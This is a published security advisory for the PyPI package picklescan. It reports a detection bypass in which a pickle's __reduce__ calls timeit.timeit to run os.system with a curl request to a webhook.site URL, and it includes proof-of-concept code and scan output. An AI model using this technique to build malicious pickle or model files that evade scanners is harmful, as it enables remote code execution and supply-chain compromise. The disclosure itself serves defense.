@@ -1,0 +1,66 @@
+PYSEC-2026-4135 PyPI/picklescan — Picklescan missing detection when calling built-in python library function timeit.timeit()
+package: picklescan
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.0.25 (ECOSYSTEM)
+aliases: CVE-2025-71351, GHSA-v7x6-rv5q-mhwc
+references:
+  https://github.com/mmaitre314/picklescan/security/advisories/GHSA-v7x6-rv5q-mhwc
+  https://nvd.nist.gov/vuln/detail/CVE-2025-71351
+  https://github.com/mmaitre314/picklescan/pull/40
+  https://github.com/mmaitre314/picklescan
+  https://github.com/mmaitre314/picklescan/releases/tag/v0.0.25
+  https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-timeit-timeit-detection-bypass
+  https://pypi.org/project/picklescan
+  https://github.com/advisories/GHSA-v7x6-rv5q-mhwc
+
+### Summary
+Using timeit.timeit() function, which is a built-in python library function to execute remote pickle file.
+
+### Details
+Pickle’s deserialization process is known to allow execution of function via reduce method. While Picklescan is meant to detect such exploits, this attack evades detection by calling built-in python library function like **timeit.timeit()**. And since timeit library wasn't inside unsafe globals blacklist, it may not raise red flag in the security scan.
+
+The attack payload executes in the following steps:
+
+First, the attacker craft the payload by calling to **timeit.timeit()** function from timeit library in __reduce__ method
+Then, inside reduce method, the attacker import dangerous libarary like os and calling **os.system()** to run OS commands, for example: curl command. And then the attacker send this malicious pickle file to the victim.
+Then when the victim after checking whether the pickle file is safe by using Picklescan library and this library doesn't dectect any dangerous functions, decide to pickle.load() this malicious pickle file, thus lead to remote code execution.
+
+### PoC
+1. The attacker crafted a malicious pickle file using built-in python library function timeit.timeit()
+```
+import pickle
+import timeit
+class Payload(object):
+    def __reduce__(self):
+        return timeit.timeit, ('','import os; os.system("curl https://webhook.site/95f3e1c3-ee37-4a5a-8544-ab4ce93475f6")')
+def create_payload():
+  with open('payload.pickle', 'wb') as f:
+    pickle.dump(Payload(), f)
+create_payload()
+```
+Then the attacker will send this pickle file to the victim computer and maybe the victim load this pickle using pickle.load()
+2. The victim will use picklescan library to check out if the received pickle file is malicious or not
+```
+picklescan -p payload.pickle
+----------- SCAN SUMMARY -----------
+Scanned files: 1
+Infected files: 0
+Dangerous globals: 0
+```
+3. Beliving that this pickle file is safe using modelscan, the victim then load this pickle file which will trigger timeit.timeit command to execute OS commands (in my example, it was curl command)
+```
+import pickle
+def load_payload():
+    with open('payload.pickle', 'rb') as f:
+      pickle.load(f)
+load_payload()
+```
+### Impact
+Severity: High
+
+Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
+What is the impact? Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
+Supply Chain Attack: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.
+### Recommended Solution
+I suggest adding timeit library to the unsafe globals blacklist.
